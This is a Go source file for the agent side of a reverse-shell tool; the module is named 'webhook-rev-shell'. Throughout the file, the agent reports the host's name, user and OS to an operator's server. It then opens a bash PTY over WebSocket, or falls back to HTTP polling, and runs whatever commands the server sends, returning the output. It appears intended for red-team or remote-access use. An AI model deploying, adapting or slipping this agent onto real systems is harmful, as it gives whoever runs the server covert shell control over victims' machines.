package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/creack/pty"
	"github.com/noahmagill/webhook-rev-shell/internal/operatorinput"
	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
	"nhooyr.io/websocket"
)

type Config struct {
	Server  string
	Session string
	Secret  string
}

var errPTYSetup = errors.New("pty setup failed")

func ConfigFromEnv() (Config, error) {
	c := Config{
		Server:  strings.TrimRight(os.Getenv("RSD_SERVER"), "/"),
		Session: os.Getenv("RSD_SESSION"),
		Secret:  os.Getenv("RSD_SECRET"),
	}
	if c.Server == "" || c.Session == "" || c.Secret == "" {
		return c, fmt.Errorf("RSD_SERVER, RSD_SESSION, RSD_SECRET required")
	}
	return c, nil
}

func Run(cfg Config) error {
	reg := buildRegister()
	if reg.Capabilities.PTY {
		err := runWebSocketPTY(cfg, reg)
		if err == nil {
			return nil
		}
		if errors.Is(err, ErrBeaconRejected) {
			return err
		}
		if !errors.Is(err, errPTYSetup) {
			return err
		}
	}
	return runHTTPPoll(cfg, reg)
}

// ErrBeaconRejected is returned when another beacon holds the session claim.
var ErrBeaconRejected = errors.New("beacon rejected")

func buildRegister() protocol.RegisterPayload {
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = "unknown"
	}
	if user == "unknown" {
		if out, err := exec.Command("id", "-un").Output(); err == nil {
			user = strings.TrimSpace(string(out))
		}
	}
	sys := CollectSystemInfo()
	ptyOK := ptyAvailable()
	return protocol.RegisterPayload{
		Host:         host,
		User:         user,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		System:       sys,
		Capabilities: protocol.Capabilities{
			PTY:        ptyOK,
			Shells:     []string{"/bin/bash", "/bin/sh"},
			Transports: []string{"websocket", "https_poll"},
		},
	}
}

func noPTYForced() bool {
	switch strings.ToLower(os.Getenv("RSD_NO_PTY")) {
	case "1", "true", "yes", "on":
		return true
	default:
		return false
	}
}

func ptyAvailable() bool {
	if noPTYForced() {
		return false
	}
	if runtime.GOOS == "windows" {
		return false
	}
	_, err := os.Stat("/dev/ptmx")
	return err == nil
}

func defaultShell() string {
	if _, err := os.Stat("/bin/bash"); err == nil {
		return "/bin/bash"
	}
	return "/bin/sh"
}

func runWebSocketPTY(cfg Config, reg protocol.RegisterPayload) error {
	if !reg.Capabilities.PTY {
		return errPTYSetup
	}

	wsURL, err := wsConnectURL(cfg)
	if err != nil {
		return errPTYSetup
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	conn, _, err := websocket.Dial(ctx, wsURL, &websocket.DialOptions{})
	if err != nil {
		return errPTYSetup
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	go func() {
		ticker := time.NewTicker(20 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				pingCtx, pingCancel := context.WithTimeout(ctx, 5*time.Second)
				err := conn.Ping(pingCtx)
				pingCancel()
				if err != nil {
					cancel()
					return
				}
			}
		}
	}()

	regJSON, _ := json.Marshal(reg)
	if err := conn.Write(ctx, websocket.MessageText, regJSON); err != nil {
		return errPTYSetup
	}

	_, ack, err := conn.Read(ctx)
	if err != nil {
		return errPTYSetup
	}
	var ackMsg struct {
		Type     string `json:"type"`
		TargetID string `json:"target_id"`
		Mode     string `json:"mode"`
		Error    string `json:"error"`
	}
	if err := json.Unmarshal(ack, &ackMsg); err != nil {
		return errPTYSetup
	}
	if ackMsg.Type == "error" || ackMsg.Error != "" {
		msg := ackMsg.Error
		if msg == "" {
			msg = "registration rejected"
		}
		fmt.Fprintf(os.Stderr, "rsd: %s\n", msg)
		return ErrBeaconRejected
	}
	if ackMsg.Mode != "pty" {
		return errPTYSetup
	}

	shell := defaultShell()
	cmd := exec.Command(shell)
	cmd.Env = os.Environ()

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return errPTYSetup
	}
	defer ptmx.Close()
	// Avoid a 0x0 terminal if the initial browser resize arrives late.
	_ = pty.Setsize(ptmx, &pty.Winsize{Rows: 24, Cols: 120})

	go func() {
		_ = cmd.Wait()
		cancel()
	}()

	go func() {
		buf := make([]byte, 32*1024)
		for {
			n, readErr := ptmx.Read(buf)
			if n > 0 {
				_ = conn.Write(ctx, websocket.MessageBinary, buf[:n])
			}
			if readErr != nil {
				cancel()
				return
			}
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		typ, data, err := conn.Read(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			return err
		}
		if cols, rows, ok := operatorinput.ParseResize(data); ok {
			_ = pty.Setsize(ptmx, &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)})
			continue
		}
		if typ == websocket.MessageText {
			continue
		}
		if _, err := ptmx.Write(data); err != nil {
			return nil
		}
	}
}

func wsConnectURL(cfg Config) (string, error) {
	u, err := url.Parse(cfg.Server)
	if err != nil {
		return "", err
	}
	switch u.Scheme {
	case "http":
		u.Scheme = "ws"
	case "https":
		u.Scheme = "wss"
	case "ws", "wss":
	default:
		u.Scheme = "ws"
	}
	u.Path = fmt.Sprintf("/s/%s/%s/connect", cfg.Session, cfg.Secret)
	return u.String(), nil
}

func registerHTTP(base string, reg protocol.RegisterPayload) (targetID string, err error) {
	regBody, _ := json.Marshal(reg)
	resp, err := http.Post(base+"/register", "application/json", bytes.NewReader(regBody))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	var out struct {
		TargetID string `json:"target_id"`
		Error    string `json:"error"`
	}
	body, _ := io.ReadAll(resp.Body)
	_ = json.Unmarshal(body, &out)
	if resp.StatusCode == http.StatusConflict || out.Error != "" {
		msg := out.Error
		if msg == "" {
			msg = "session has active beacon"
		}
		fmt.Fprintf(os.Stderr, "rsd: %s\n", msg)
		return "", ErrBeaconRejected
	}
	if out.TargetID == "" {
		return "", fmt.Errorf("register failed")
	}
	return out.TargetID, nil
}

const maxCommandLine = 64 * 1024

// cmdShell is a minimal line-oriented shell used when no PTY is available.
// It tracks cwd, intercepts builtins, and runs other commands via /bin/sh -c.
type cmdShell struct {
	shell string
	cwd   string
	user  string
	host  string
	home  string
}

func newCmdShell() *cmdShell {
	cwd, err := os.Getwd()
	if err != nil || cwd == "" {
		cwd = "/"
	}
	host, _ := os.Hostname()
	if host == "" {
		host = "target"
	}
	user := os.Getenv("USER")
	if user == "" {
		if out, err := exec.Command("id", "-un").Output(); err == nil {
			user = strings.TrimSpace(string(out))
		}
	}
	if user == "" {
		user = "rs"
	}
	home, _ := os.UserHomeDir()
	if home == "" {
		home = os.Getenv("HOME")
	}
	return &cmdShell{shell: defaultShell(), cwd: cwd, user: user, host: host, home: home}
}

func (s *cmdShell) prompt() string {
	disp := s.cwd
	if s.home != "" && (s.cwd == s.home || strings.HasPrefix(s.cwd, s.home+"/")) {
		disp = "~" + strings.TrimPrefix(s.cwd, s.home)
	}
	tag := "$"
	if s.user == "root" {
		tag = "#"
	}
	return fmt.Sprintf("\x1b[1;32m%s@%s\x1b[0m:\x1b[1;34m%s\x1b[0m%s ", s.user, s.host, disp, tag)
}

func (s *cmdShell) expand(p string) string {
	if p == "" {
		return s.home
	}
	if p == "~" {
		return s.home
	}
	if strings.HasPrefix(p, "~/") {
		return filepath.Join(s.home, p[2:])
	}
	if !filepath.IsAbs(p) {
		return filepath.Join(s.cwd, p)
	}
	return p
}

// run executes one line. Returns (output, exit).
func (s *cmdShell) run(line string) (string, bool) {
	trimmed := strings.TrimSpace(line)
	if trimmed == "" {
		return "", false
	}
	switch trimmed {
	case "exit", "quit", "logout":
		return "", true
	case "clear":
		return "\x1b[2J\x1b[H", false
	case "pwd":
		return s.cwd + "\n", false
	}
	if trimmed == "cd" {
		s.cwd = s.home
		return "", false
	}
	if strings.HasPrefix(trimmed, "cd ") || strings.HasPrefix(trimmed, "cd\t") {
		target := strings.TrimSpace(trimmed[2:])
		target = s.expand(target)
		abs, err := filepath.Abs(target)
		if err != nil {
			return fmt.Sprintf("cd: %v\n", err), false
		}
		info, err := os.Stat(abs)
		if err != nil {
			return fmt.Sprintf("cd: %s: %v\n", target, err), false
		}
		if !info.IsDir() {
			return fmt.Sprintf("cd: %s: not a directory\n", target), false
		}
		s.cwd = abs
		return "", false
	}

	c := exec.Command(s.shell, "-c", line)
	c.Env = withEnvOverrides(os.Environ(), map[string]string{
		"PWD":  s.cwd,
		"TERM": "dumb",
	})
	c.Dir = s.cwd
	out, _ := c.CombinedOutput()
	return string(out), false
}

func withEnvOverrides(base []string, overrides map[string]string) []string {
	out := make([]string, 0, len(base)+len(overrides))
	for _, kv := range base {
		key, _, ok := strings.Cut(kv, "=")
		if ok {
			if _, exists := overrides[key]; exists {
				continue
			}
		}
		out = append(out, kv)
	}
	for key, value := range overrides {
		out = append(out, key+"="+value)
	}
	return out
}

// normalizeCRLF ensures every \n is preceded by \r so raw-mode terminals don't staircase.
func normalizeCRLF(b []byte) []byte {
	out := make([]byte, 0, len(b)+8)
	var prev byte
	for _, c := range b {
		if c == '\n' && prev != '\r' {
			out = append(out, '\r')
		}
		out = append(out, c)
		prev = c
	}
	return out
}

func runHTTPPoll(cfg Config, reg protocol.RegisterPayload) error {
	reg.Capabilities.PTY = false
	base := fmt.Sprintf("%s/s/%s/%s", cfg.Server, cfg.Session, cfg.Secret)
	client := &http.Client{Timeout: 35 * time.Second}

	targetID, err := registerHTTP(base, reg)
	if err != nil {
		return err
	}

	sh := newCmdShell()
	push := func(b []byte) {
		if len(b) == 0 {
			return
		}
		_, _ = client.Post(base+"/push?target_id="+targetID, "application/octet-stream", bytes.NewReader(b))
	}

	banner := fmt.Sprintf("\r\n\x1b[33mrs-agent: HTTP command mode (no PTY).\x1b[0m  type 'exit' to quit.\r\n\r\n%s", sh.prompt())
	push([]byte(banner))

	var lineBuf bytes.Buffer
	flush := func(buf *bytes.Buffer) {
		if buf.Len() == 0 {
			return
		}
		push(buf.Bytes())
		buf.Reset()
	}
	processLine := func() bool {
		line := lineBuf.String()
		lineBuf.Reset()
		out, exit := sh.run(line)
		if exit {
			push([]byte("\r\nbye.\r\n"))
			return true
		}
		if out != "" {
			b := normalizeCRLF([]byte(out))
			if b[len(b)-1] != '\n' {
				b = append(b, '\r', '\n')
			}
			push(b)
		}
		push([]byte(sh.prompt()))
		return false
	}

	for {
		req, err := http.NewRequest(http.MethodGet, base+"/poll?target_id="+targetID, nil)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		pollResp, err := client.Do(req)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		if pollResp.StatusCode != http.StatusOK &&
			pollResp.StatusCode != http.StatusGone &&
			pollResp.StatusCode != http.StatusNoContent {
			_, _ = io.Copy(io.Discard, pollResp.Body)
			pollResp.Body.Close()
			time.Sleep(1500 * time.Millisecond)
			continue
		}
		if pollResp.StatusCode == http.StatusGone {
			pollResp.Body.Close()
			return nil
		}
		if pollResp.StatusCode == http.StatusNoContent {
			pollResp.Body.Close()
			continue
		}
		cmdBytes, _ := io.ReadAll(pollResp.Body)
		pollResp.Body.Close()
		cmdBytes = operatorinput.StripResizeMessages(cmdBytes)
		if len(cmdBytes) == 0 {
			continue
		}

		var echo bytes.Buffer
		i := 0
		for i < len(cmdBytes) {
			b := cmdBytes[i]
			// strip ANSI/CSI escape sequences (arrow keys etc.) - we don't support history
			if b == 0x1b {
				j := i + 1
				if j < len(cmdBytes) && cmdBytes[j] == '[' {
					j++
					for j < len(cmdBytes) && !((cmdBytes[j] >= 0x40 && cmdBytes[j] <= 0x7e)) {
						j++
					}
					if j < len(cmdBytes) {
						j++
					}
				}
				i = j
				continue
			}
			switch b {
			case '\r', '\n':
				echo.WriteString("\r\n")
				flush(&echo)
				if processLine() {
					return nil
				}
			case 0x7f, 0x08:
				if lineBuf.Len() > 0 {
					data := lineBuf.Bytes()
					lineBuf.Truncate(len(data) - 1)
					echo.WriteString("\b \b")
				}
			case 0x03:
				lineBuf.Reset()
				echo.WriteString("^C\r\n")
				flush(&echo)
				push([]byte(sh.prompt()))
			case 0x04:
				if lineBuf.Len() == 0 {
					push([]byte("\r\nbye.\r\n"))
					return nil
				}
			case '\t':
				lineBuf.WriteByte(' ')
				echo.WriteByte(' ')
			default:
				if b >= 0x20 && b < 0x7f {
					if lineBuf.Len() >= maxCommandLine {
						lineBuf.Reset()
						echo.Reset()
						push([]byte("\r\nrs-agent: line too long\r\n"))
						push([]byte(sh.prompt()))
						break
					}
					lineBuf.WriteByte(b)
					echo.WriteByte(b)
				}
			}
			i++
		}
		flush(&echo)
	}
}
